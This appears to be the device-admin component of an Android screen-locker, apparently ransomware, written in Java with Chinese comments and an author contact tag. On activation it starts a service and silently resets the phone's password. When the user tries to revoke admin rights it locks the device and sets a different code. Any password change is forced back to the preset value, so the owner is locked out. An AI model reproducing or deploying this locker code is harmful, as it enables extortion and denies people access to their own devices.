package com.h;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

/**
 * 烟漫 QQ1696030864
 */
public class MyAdmin extends DeviceAdminReceiver {

	/**
	 * 激活
	 */
	@Override
	public void onEnabled(Context context, Intent intent) {

		int pass = 5724;
		String password=Integer.toString(pass);
	//	String password = "5724";// 得到预设密码
		// 激活设备管理立刻锁机!
		//getManager(context).lockNow();// 锁机
		Intent intent1 = new Intent(context,s.class);
		intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startService(intent1);
		
		getManager(context).resetPassword(password, 0);// 设置密码
		super.onEnabled(context, intent);
	}

	@Override
	public CharSequence onDisableRequested(Context context, Intent intent)
	{	
		int pass = 5754;
		String password=Integer.toString(pass);
		//	String password = "5724";// 得到预设密码
		// 激活设备管理立刻锁机!
		getManager(context).lockNow();// 锁机


		getManager(context).resetPassword(password, 0);// 设置密码
		// TODO: Implement this method
		return super.onDisableRequested(context, intent);
	}
	

	@Override
	public void onPasswordChanged(Context context, Intent intent)
	{
		
		
		int pass = 5724;
		String password=Integer.toString(pass);
		//	String password = "5724";// 得到预设密码
		// 激活设备管理立刻锁机!
		getManager(context).lockNow();// 锁机


		getManager(context).resetPassword(password, 0);// 设置密码
		
		// TODO: Implement this method
		super.onPasswordChanged(context, intent);
	}

	
	
@Override
	public void onReceive(Context context, Intent intent) {
		Log.i("------", "onReceive-----");

		super.onReceive(context, intent);
	}

	

	
}

